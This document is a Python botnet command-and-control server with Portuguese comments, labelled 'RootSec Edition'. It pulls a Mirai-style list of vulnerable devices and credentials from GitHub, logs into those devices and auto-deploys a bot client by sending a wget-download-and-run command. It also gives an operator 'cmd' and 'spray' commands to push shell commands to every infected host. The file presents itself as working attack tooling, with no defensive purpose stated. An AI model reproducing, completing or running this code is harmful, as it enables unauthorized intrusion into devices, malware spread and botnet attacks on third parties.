import socket
import threading
import uuid
import urllib.request
from time import sleep
import ssl # Importado para suportar TLS/SSL

# Cores para o terminal
RESET = "\033[0m"
VERDE = "\033[32m"
AMARELO = "\033[33m"
VERMELHO = "\033[31m"

# Armazenamento de bots: { bot_id: socket_connection }
bots_pool = {}
selected_bot = None
MAX_SCAN_IPS = 1000  # Padrão: scanear até 1000 IPs por ciclo
SERVER_PUBLIC_IP = "45.157.16.196"

# URL do client.py para deploy
server_url_global = "https://raw.githubusercontent.com/nubao822123-coder/letacas/refs/heads/main/client.py"

def start_server(host="0.0.0.0", port=8080):
    try:
        sv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sv.bind((host, port))
        sv.listen(100) # Aceita mais conexões simultâneas
        print(f"{VERDE}[+] Botnet Server active on {host}:{port}{RESET}")
        return sv
    except Exception as e:
        print(f"{VERMELHO}[!] Error starting server: {e}{RESET}")
        return None

def keep_alive(conn, bot_id):
    """Envia pacotes de manutenção para evitar que o bot desconecte por timeout."""
    try:
        while True:
            sleep(15) # Intervalo reduzido para 15s
            if bot_id in bots_pool:
                # Tenta enviar um comando neutro que não gera saída
                conn.sendall(b"\n")
            else:
                break
    except:
        pass

def handle_bot(conn, addr):
    global bots_pool
    bot_id = str(uuid.uuid4())[:8]
    
    try:
        # Tenta detectar se a conexão é SSL/TLS
        # Usamos MSG_PEEK para olhar o primeiro byte sem removê-lo do buffer
        peek = conn.recv(1, socket.MSG_PEEK)
        if peek == b'\x16':
            print(f"{AMARELO}[*] TLS connection detected from {addr}. Wrapping socket...{RESET}")
            # Cria um contexto SSL simples para aceitar conexões
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Nota: Para funcionar perfeitamente, o servidor precisa de um certificado.
            # Se não houver certificado, o handshake pode falhar.
            # Em bots de IoT, muitas vezes eles ignoram a verificação.
            conn = context.wrap_socket(conn, server_side=True)
    except Exception as e:
        # Se falhar o SSL, continuamos como TCP puro
        pass

    bots_pool[bot_id] = conn
    print(f"\n{VERDE}[+] Bot connected: {addr} | ID: {bot_id}{RESET}")
    
    threading.Thread(target=keep_alive, args=(conn, bot_id), daemon=True).start()
# ...existing code...
# ...existing code...
    
    # --- DEPLOY AUTOMÁTICO ROBUSTO ---
    try:
        # 1. Limpa a sessão e garante que o shell está pronto
        conn.sendall(b"\n")
        sleep(0.2)
        
        # 2. Tenta baixar o client.py
        # Usamos nohup e redirecionamos a saída para evitar que o bot trave
        # Tentamos python3 primeiro, depois python
        deploy_cmd = (
            f"wget {server_url_global} -O /tmp/client.py && "
            f"chmod +x /tmp/client.py && "
            f"(python3 /tmp/client.py & || python /tmp/client.py &) > /dev/null 2>&1 &\n"
        )
        
        conn.sendall(deploy_cmd.encode())
        print(f"{AMARELO}[*] Attempting robust auto-deploy on {bot_id} to {SERVER_PUBLIC_IP}...{RESET}")
    except:
        pass
    # ------------------------------------
    
    print("c2> ", end="", flush=True)

    try:
        while True:
            # Buffer maior para evitar fragmentação de banners longos
            data = conn.recv(4096) 
            if not data:
                break
            
            # Tenta decodificar, ignorando erros de caracteres binários
            decoded_data = data.decode(errors='ignore').strip()
            if decoded_data:
                print(f"\n{AMARELO}[Bot {bot_id}]: {decoded_data}{RESET}")
                print("c2> ", end="", flush=True)
    except (ConnectionResetError, socket.error):
        pass
    except Exception as e:
        print(f"\n{VERMELHO}[!] Error in bot {bot_id}: {e}{RESET}")
    finally:
        print(f"\n{VERMELHO}[-] Bot disconnected: {bot_id}{RESET}")
        if bot_id in bots_pool:
            del bots_pool[bot_id]
        try:
            conn.close()
        except:
            pass

def attempt_connection(ip_port, user, password, port=None):
    """Tenta estabelecer uma conexão com um bot usando credenciais."""
    try:
        # Separa IP e Porta se vierem juntos
        if ":" in ip_port:
            host, p = ip_port.rsplit(":", 1)
            port = int(p)
        else:
            host = ip_port
            port = port or 8080

        s = socket.create_connection((host, port), timeout=1.0) # Timeout reduzido para 1s
        
        # Tenta autenticação simples (estilo Telnet/Mirai)
        # Envia usuário e senha rapidamente
        s.sendall(f"{user}\n".encode())
        s.sendall(f"{password}\n".encode())
        
        print(f"{VERDE}[+] Bot AUTHENTICATED: {host}:{port} ({user}:{password}){RESET}")
        # Passa a conexão para o handle_bot do servidor
        threading.Thread(target=handle_bot, args=(s, (host, port)), daemon=True).start()
    except:
        pass

def scanner_loop():
    """Lê a lista de bots e tenta conectar múltiplos bots em paralelo."""
    while True:
        targets = load_external_list()
        if not targets:
            print(f"{VERMELHO}[!] No targets to scan. Waiting 60s...{RESET}")
            sleep(60)
            continue
            
        scan_list = targets[:MAX_SCAN_IPS]
        print(f"{AMARELO}[*] Starting FAST parallel scan of {len(scan_list)} targets...{RESET}")
        
        threads = []
        for line in scan_list:
            try:
                parts = line.split()
                if len(parts) >= 2:
                    conn_info, auth_info = parts[0], parts[1]
                    user, password = auth_info.split(":", 1)
                    t = threading.Thread(target=attempt_connection, args=(conn_info, user, password), daemon=True)
                    t.start()
                    threads.append(t)
                else:
                    t = threading.Thread(target=attempt_connection, args=(line,), daemon=True)
                    t.start()
                    threads.append(t)
            except Exception:
                continue
            
            # Controla a explosão de threads para não travar a CPU/RAM
            if len(threads) >= 500:
                sleep(0.5)
                threads = []

        print(f"{VERDE}[+] Scan cycle submitted. Waiting for responses...{RESET}")
        sleep(3600) # Reinicia a cada hora

def load_external_list():
    url = "https://raw.githubusercontent.com/R00tS3c/DDOS-RootSec/refs/heads/master/Botnets/Vuln%20lists%20(Mirai%20loader)/50KR00TS3C.txt"
    try:
        print(f"[*] Downloading target list from RootSec...")
        with urllib.request.urlopen(url) as response:
            content = response.read().decode('utf-8')
            targets = [line.strip() for line in content.splitlines() if line.strip()]
            print(f"{VERDE}[+] Loaded {len(targets)} potential targets.{RESET}")
            return targets
    except Exception as e:
        print(f"{VERMELHO}[!] Failed to load list: {e}{RESET}")
        return []

def commands_loop():
    global selected_bot
    while True:
        try:
            msg = input("c2> ").strip()
            if not msg: continue
            
            parts = msg.split(maxsplit=1)
            cmd = parts[0]
            args = parts[1] if len(parts) > 1 else ""

            if cmd == "help":
                print(f"""
{AMARELO}Botnet Control Panel - Commands:{RESET}
  list             - List all connected bots
  use <id>         - Select a bot
  cmd <msg>        - Send raw command to selected bot
  spray <msg>      - Send command to ALL bots
  spray_keep       - Send stability pulse to ALL bots
  load            - Load RootSec vuln list
  scan            - Start connecting to the vuln list
  seturl <url>    - Change the client.py deploy URL
  setmax <num>    - Change maximum IPs to scan per cycle
  exit             - Shutdown server
                """)
            
            elif cmd == "list":
                print(f"\n{VERDE}Connected Bots ({len(bots_pool)}):{RESET}")
                for bid in bots_pool:
                    print(f" - {bid}")
            
            elif cmd == "use":
                if args in bots_pool:
                    selected_bot = args
                    print(f"Using bot {args}")
                else:
                    print("Invalid Bot ID")
            
            elif cmd == "cmd":
                if selected_bot and selected_bot in bots_pool:
                    bots_pool[selected_bot].sendall(args.encode() + b"\n")
                else:
                    print("No bot selected. Use 'use <id>'")
            
            elif cmd == "spray":
                print(f"Spraying to {len(bots_pool)} bots...")
                for conn in bots_pool.values():
                    try:
                        conn.sendall(args.encode() + b"\n")
                    except: pass
            
            elif cmd == "spray_keep":
                print(f"Sending stability pulse to {len(bots_pool)} bots...")
                for bid, conn in bots_pool.items():
                    try:
                        conn.sendall(b"\n")
                    except: pass
                print("Pulse sent.")
            
            elif cmd == "load":
                load_external_list()
            
            elif cmd == "seturl":
                if args:
                    global server_url_global
                    server_url_global = args
                    print(f"Deploy URL updated to: {server_url_global}")
                else:
                    print("Usage: seturl <url>")
            
            elif cmd == "setmax":
                if args.isdigit():
                    global MAX_SCAN_IPS
                    MAX_SCAN_IPS = int(args)
                    print(f"Max scan IPs set to {MAX_SCAN_IPS}")
                else:
                    print("Usage: setmax <number>")
            
            elif cmd == "scan":
                print(f"{AMARELO}[*] Starting scanner in background...{RESET}")
                threading.Thread(target=scanner_loop, daemon=True).start()
            
            elif cmd == "exit":
                print("Shutting down...")
                import os; os._exit(0)
            
            else:
                print("Unknown command. Type 'help'")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    print(r"""
    ########################################
    #         BOTNET CONTROL CENTER       #
    #            ROOTSEC EDITION          #
    ########################################
    """)
    
    server = start_server()
    if server:
        # Thread para processar comandos do operador
        threading.Thread(target=commands_loop, daemon=True).start()
        
        try:
            while True:
                conn, addr = server.accept()
                # Cada bot em sua própria thread
                threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("\nStopped.")